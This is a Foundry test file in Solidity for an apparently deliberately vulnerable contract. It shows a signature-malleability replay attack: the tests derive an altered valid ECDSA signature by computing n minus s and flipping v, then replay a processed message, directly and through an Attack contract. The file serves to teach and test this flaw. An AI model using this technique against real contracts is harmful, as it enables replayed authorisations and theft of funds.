pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/8.3.2-Improper-Check-against-Signature-Replay-Attacks-vulnerability.sol";

contract VulnerableTest is Test {
    Vulnerable vulnerable;
    Attack attackContract;

    // Use a fixed private key for the designated signer
    uint256 constant SIGNER_PRIVATE_KEY = 0xAABBCCDDEEFF00112233445566778899AABBCCDDEEFF00112233445566778899;
    address signer;

    // secp256k1 order constant
    uint256 constant SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function setUp() public {
        signer = vm.addr(SIGNER_PRIVATE_KEY);
        // deploy the Vulnerable contract with our signer
        vulnerable = new Vulnerable(signer);
        // deploy the Attack contract
        attackContract = new Attack(address(vulnerable));
    }

    // Helper: generates a valid signature from the designated signer and its altered (malleated) version.
    // We use the vulnerability target's toEthSignedMessageHash function.
    function _generateSignatures(string memory _message) internal returns (bytes memory originalSig, bytes memory alteredSig) {
        // compute the hash that will be signed (the Ethereum Signed Message hash for the plain message hash)
        bytes32 messageHash = keccak256(abi.encodePacked(_message));
        bytes32 ethSignedMessageHash = vulnerable.toEthSignedMessageHash(messageHash);

        // sign using the cheatcode vm.sign, which returns (v, r, s)
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_PRIVATE_KEY, ethSignedMessageHash);

        // pack the standard signature: r || s || v
        originalSig = abi.encodePacked(r, s, v);

        // Now generate an altered but valid signature using signature malleability.
        // The alternative s is computed as: altS = SECP256K1_N - s
        // And the recovery id must be flipped: if v==27 then altV = 28, else 27
        uint256 sUint = uint256(s);
        uint256 altSUint = SECP256K1_N - sUint;
        bytes32 altS = bytes32(altSUint);
        uint8 altV = v == 27 ? 28 : 27;

        alteredSig = abi.encodePacked(r, altS, altV);
    }

    // Test that using the same signature twice (without alteration) reverts due to duplicate processing
    function testProcessMessageRevertOnDuplicateSignature() public {
        string memory message = "Duplicate Test";
        (bytes memory sig, ) = _generateSignatures(message);

        // First call should process correctly
        vulnerable.processMessage(message, sig);

        // Second call with the exact same signature should revert
        vm.expectRevert("Message already processed");
        vulnerable.processMessage(message, sig);
    }

    // Test that replaying the message with an altered (malleated) signature bypasses the duplicate hash check
    // and both calls are processed. This is the vulnerability.
    function testReplayAttackWithAlteredSignature() public {
        string memory message = "Hello, world!";
        (bytes memory originalSig, bytes memory alteredSig) = _generateSignatures(message);

        // First call with the original signature
        vulnerable.processMessage(message, originalSig);

        // Second call with the altered signature should also pass because the hash is computed including the signature
        vulnerable.processMessage(message, alteredSig);

        // Verify that both processedHashes entries are set. They are computed as keccak256(abi.encodePacked(address(vulnerable), message, signature))
        bytes32 hashOriginal = keccak256(abi.encodePacked(address(vulnerable), message, originalSig));
        bytes32 hashAltered = keccak256(abi.encodePacked(address(vulnerable), message, alteredSig));

        assertTrue(vulnerable.processedHashes(hashOriginal), "Original message hash not marked as processed");
        assertTrue(vulnerable.processedHashes(hashAltered), "Altered message hash not marked as processed");

        // Also, ensure that the two hashes are different
        assertTrue(hashOriginal != hashAltered, "Hashes should differ due to signature malleability");
    }

    // Test using the Attack contract to perform the replay attack within a single transaction
    function testAttackContractReplay() public {
        string memory message = "Attack via contract";
        (bytes memory originalSig, bytes memory alteredSig) = _generateSignatures(message);

        // Use the Attack contract to invoke the replay attack method which calls processMessage twice,
        // with the original and the altered signature.
        attackContract.attack(message, originalSig, alteredSig);

        // Compute the respective message hashes in Vulnerable contract
        bytes32 hashOriginal = keccak256(abi.encodePacked(address(vulnerable), message, originalSig));
        bytes32 hashAltered = keccak256(abi.encodePacked(address(vulnerable), message, alteredSig));

        assertTrue(vulnerable.processedHashes(hashOriginal), "Original signature hash unprocessed");
        assertTrue(vulnerable.processedHashes(hashAltered), "Altered signature hash unprocessed");

        // Check that the two hashes are indeed different
        assertTrue(hashOriginal != hashAltered, "Signatures were not treated as unique");
    }
}
